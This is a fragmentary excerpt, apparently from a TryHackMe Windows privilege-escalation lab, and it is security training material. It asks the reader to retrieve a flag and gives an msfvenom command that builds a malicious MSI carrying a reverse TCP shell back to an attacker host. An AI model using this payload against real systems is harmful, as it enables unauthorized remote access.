...
Go to taskusr1 desktop to retrieve a flag. Don't forget to input the flag at the end of this task.
  ...
  on my box to read file in sheel
...
```shell-session
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_10.10.134.40 LPORT=LOCAL_PORT -f msi -o malicious.msi
```
...
Only subscribers can deploy virtual machines in this room! Go to your [profile](https://tryhackme.com/profile) page to subscribe (if you have not already). 4420 users are in here and this room is 83 days old.